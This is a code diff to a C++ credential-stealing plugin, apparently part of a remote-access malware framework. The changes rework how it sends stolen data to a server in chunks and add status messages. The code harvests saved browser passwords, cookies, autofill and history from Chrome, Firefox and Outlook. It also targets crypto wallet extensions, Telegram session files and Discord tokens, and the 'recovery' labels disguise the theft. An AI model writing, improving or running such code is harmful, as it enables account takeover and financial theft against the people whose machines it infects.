@@ -73,43 +73,65 @@ static std::vector<WalletMetadata> target_wallets = {
     {"coinbasewallet", "hnfanknocfeofbddgcijnmhnfnkdnaad", "coinbase wallet"}
 };
 
-void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
+static void send_status(SOCKET sock, const std::string& msg) {
+    if (sock == INVALID_SOCKET) return;
+    std::string json_msg = "{\"action\":\"recovery_status\",\"message\":\"" + msg + "\"}\r\n";
+    send_with_mutex(sock, json_msg.c_str(), (int)json_msg.size());
+}
+
+static void send_data_in_chunks(SOCKET sock, const std::string& relPath, const uint8_t* data, size_t data_size) {
     if (sock == INVALID_SOCKET) return;
 
-    const size_t CHUNK_SIZE = 512 * 1024; // 512KB chunks
+    const size_t CHUNK_SIZE = 1024 * 1024; // 1MB chunks
     size_t total_sent = 0;
-    size_t data_size = data.size();
 
     do {
         size_t current_chunk = (data_size - total_sent > CHUNK_SIZE) ? CHUNK_SIZE : (data_size - total_sent);
-
         uint32_t pathLen = (uint32_t)relPath.size();
-        uint32_t payloadSize = (uint32_t)current_chunk;
-        uint32_t totalSize = sizeof(uint32_t) + pathLen + payloadSize;
+        uint32_t totalSize = sizeof(uint32_t) + pathLen + (uint32_t)current_chunk;
 
-        PacketHeader header;
-        header.signature = PACKET_SIGNATURE;
-        header.type = PACKET_TYPE_RECOVERY_FILE;
-        header.size = totalSize;
-
-        std::vector<uint8_t> packet;
-        packet.resize(sizeof(PacketHeader) + totalSize);
-        memcpy(packet.data(), &header, sizeof(PacketHeader));
+        // Use a static-ish or pre-allocated buffer for the packet to reduce allocations?
+        // For 1MB chunks, a simple vector is fine, but let's be direct.
+        std::vector<uint8_t> packet(sizeof(PacketHeader) + totalSize);
+        PacketHeader* header = (PacketHeader*)packet.data();
+        header->signature = PACKET_SIGNATURE;
+        header->type = PACKET_TYPE_RECOVERY_FILE;
+        header->size = totalSize;
 
         uint8_t* ptr = packet.data() + sizeof(PacketHeader);
-        memcpy(ptr, &pathLen, sizeof(uint32_t));
+        *(uint32_t*)ptr = pathLen;
         ptr += sizeof(uint32_t);
         memcpy(ptr, relPath.c_str(), pathLen);
         ptr += pathLen;
-
-        if (current_chunk > 0) {
-            memcpy(ptr, data.data() + total_sent, current_chunk);
-        }
+        if (current_chunk > 0) memcpy(ptr, data + total_sent, current_chunk);
 
         send_with_mutex(sock, (const char*)packet.data(), (int)packet.size());
-
         total_sent += current_chunk;
     } while (total_sent < data_size);
+}
+
+void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
+    send_data_in_chunks(sock, relPath, data.data(), data.size());
+}
+
+static void send_string_to_server(SOCKET sock, const std::string& relPath, const std::string& data) {
+    send_data_in_chunks(sock, relPath, (const uint8_t*)data.data(), data.size());
+}
+
+static void send_file_from_disk(SOCKET sock, const fs::path& filePath, const std::string& relPath) {
+    std::ifstream ifs(filePath, std::ios::binary);
+    if (!ifs) return;
+
+    const size_t CHUNK_SIZE = 1024 * 1024; // 1MB
+    std::vector<uint8_t> buffer(CHUNK_SIZE);
+
+    while (ifs) {
+        ifs.read((char*)buffer.data(), CHUNK_SIZE);
+        std::streamsize bytes_read = ifs.gcount();
+        if (bytes_read > 0) {
+            send_data_in_chunks(sock, relPath, buffer.data(), (size_t)bytes_read);
+        }
+    }
 }
 
 void send_directory_recursively(SOCKET sock, const fs::path& source_dir, const std::string& server_path_prefix) {
@@ -118,13 +140,9 @@ void send_directory_recursively(SOCKET sock, const fs::path& source_dir, const s
     for (const auto& entry : fs::recursive_directory_iterator(source_dir, ec)) {
         if (ec) break;
         if (entry.is_regular_file()) {
-            std::ifstream ifs(entry.path(), std::ios::binary);
-            if (ifs) {
-                std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-                std::string rel = fs::relative(entry.path(), source_dir).string();
-                std::replace(rel.begin(), rel.end(), '\\', '/');
-                send_file_to_server(sock, server_path_prefix + "/" + rel, data);
-            }
+            std::string rel = fs::relative(entry.path(), source_dir).string();
+            std::replace(rel.begin(), rel.end(), '\\', '/');
+            send_file_from_disk(sock, entry.path(), server_path_prefix + "/" + rel);
         }
     }
 }
@@ -244,6 +262,8 @@ void run_recovery(SOCKET sock) {
         send_with_mutex(sock, start_msg.c_str(), (int)start_msg.size());
     }
 
+    send_status(sock, "Starting browser recovery...");
+
     std::vector<BrowserConfig> configs = {
         {"New Outlook", "", {}, "", {L"Microsoft", L"Olk", L"EBWebView"}, "mail_clients/Outlook", "outlook_tmp", false, false, false, false},
         {"Google Chrome", "chrome.exe", {L"Google\\Chrome\\Application\\chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "browsers/Google Chrome", "chrome_tmp", false, false, true, false},
@@ -268,6 +288,8 @@ void run_recovery(SOCKET sock) {
              user_data_dir = get_user_data_dir({L"Microsoft", L"Olk", L"EBWebView"}, false);
         }
         if (user_data_dir.empty()) continue;
+
+        send_status(sock, "Checking " + config.name + "...");
 
         std::vector<uint8_t> v10_key;
         bool is_dpapi = false;
@@ -360,6 +382,7 @@ void run_recovery(SOCKET sock) {
         }
     }
     extract_telegram_session(sock);
+    send_status(sock, "Recovery completed.");
 }
 
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
@@ -672,8 +695,8 @@ void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::str
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/passwords.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/passwords.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            send_string_to_server(sock, out_prefix + "/passwords.txt", oss_txt.str());
+            send_string_to_server(sock, out_prefix + "/passwords.json", oss_json.str());
         }
         sqlite3_close(db);
     }
@@ -738,8 +761,8 @@ void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::strin
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/cookies.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/cookies.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            send_string_to_server(sock, out_prefix + "/cookies.txt", oss_txt.str());
+            send_string_to_server(sock, out_prefix + "/cookies.json", oss_json.str());
         }
         sqlite3_close(db);
     }
@@ -813,8 +836,8 @@ void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::stri
         }
     }
     oss_json << "\n]";
-    std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/autofill.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-    std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/autofill.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+    send_string_to_server(sock, out_prefix + "/autofill.txt", oss_txt.str());
+    send_string_to_server(sock, out_prefix + "/autofill.json", oss_json.str());
 }
 
 void extract_history(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
@@ -841,8 +864,8 @@ void extract_history(SOCKET sock, const fs::path& profile_path, const std::strin
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/history.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/history.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            send_string_to_server(sock, out_prefix + "/history.txt", oss_txt.str());
+            send_string_to_server(sock, out_prefix + "/history.json", oss_json.str());
         }
         sqlite3_close(db);
     }
@@ -945,8 +968,8 @@ void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const st
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/cookies.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/cookies.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            send_string_to_server(sock, out_prefix + "/cookies.txt", oss_txt.str());
+            send_string_to_server(sock, out_prefix + "/cookies.json", oss_json.str());
         }
         sqlite3_close(db);
     }
@@ -976,8 +999,8 @@ void extract_firefox_history(SOCKET sock, const fs::path& profile_path, const st
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/history.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/history.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            send_string_to_server(sock, out_prefix + "/history.txt", oss_txt.str());
+            send_string_to_server(sock, out_prefix + "/history.json", oss_json.str());
         }
         sqlite3_close(db);
     }
@@ -1004,8 +1027,8 @@ void extract_firefox_autofill(SOCKET sock, const fs::path& profile_path, const s
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/autofill.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/autofill.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            send_string_to_server(sock, out_prefix + "/autofill.txt", oss_txt.str());
+            send_string_to_server(sock, out_prefix + "/autofill.json", oss_json.str());
         }
         sqlite3_close(db);
     }
@@ -1063,8 +1086,8 @@ void extract_firefox_passwords(SOCKET sock, const fs::path& profile_path, const 
                         pos = end;
                     }
                     oss_json << "\n]";
-                    std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/passwords.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-                    std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/passwords.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+                    send_string_to_server(sock, out_prefix + "/passwords.txt", oss_txt.str());
+                    send_string_to_server(sock, out_prefix + "/passwords.json", oss_json.str());
                 }
             }
             nss.PK11_FreeSlot(slot);
@@ -1151,13 +1174,14 @@ void extract_telegram_session(SOCKET sock) {
     wchar_t* appdata; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) != S_OK) return;
     fs::path tdata_path = fs::path(appdata) / L"Telegram Desktop" / L"tdata"; CoTaskMemFree(appdata);
     if (!fs::exists(tdata_path)) return;
-    auto send_tdata_file = [&](const fs::path& src) {
-        if (fs::exists(src)) {
-            std::ifstream ifs(src, std::ios::binary); std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-            send_file_to_server(sock, "telegram session/tdata/" + src.filename().string(), data);
-        }
-    };
-    for (const auto& f : {"key_datas", "map0", "map1", "settingss"}) send_tdata_file(tdata_path / f);
+
+    send_status(sock, "Extracting Telegram session...");
+
+    for (const auto& f : {"key_datas", "map0", "map1", "settingss"}) {
+        fs::path src = tdata_path / f;
+        if (fs::exists(src)) send_file_from_disk(sock, src, "telegram session/tdata/" + src.filename().string());
+    }
+
     for (const auto& entry : fs::directory_iterator(tdata_path)) {
         if (entry.is_directory()) {
             std::string folder_name = entry.path().filename().string();
@@ -1166,8 +1190,7 @@ void extract_telegram_session(SOCKET sock) {
                     if (!sub_entry.is_directory()) {
                         std::string filename = sub_entry.path().filename().string();
                         if (filename.find(".log") == std::string::npos && filename.find("dumps") == std::string::npos) {
-                            std::ifstream ifs(sub_entry.path(), std::ios::binary); std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-                            send_file_to_server(sock, "telegram session/tdata/" + folder_name + "/" + fs::relative(sub_entry.path(), entry.path()).string(), data);
+                            send_file_from_disk(sock, sub_entry.path(), "telegram session/tdata/" + folder_name + "/" + fs::relative(sub_entry.path(), entry.path()).string());
                         }
                     }
                 }
@@ -1206,7 +1229,7 @@ void extract_discord_tokens(SOCKET sock, const std::wstring& discord_path_w, con
             first = false;
         }
         oss_json << "\n]";
-        std::string str_txt = oss_txt.str(); send_file_to_server(sock, "discord/" + output_name + "/tokens.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-        std::string str_json = oss_json.str(); send_file_to_server(sock, "discord/" + output_name + "/tokens.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+        send_string_to_server(sock, "discord/" + output_name + "/tokens.txt", oss_txt.str());
+        send_string_to_server(sock, "discord/" + output_name + "/tokens.json", oss_json.str());
     }
 }
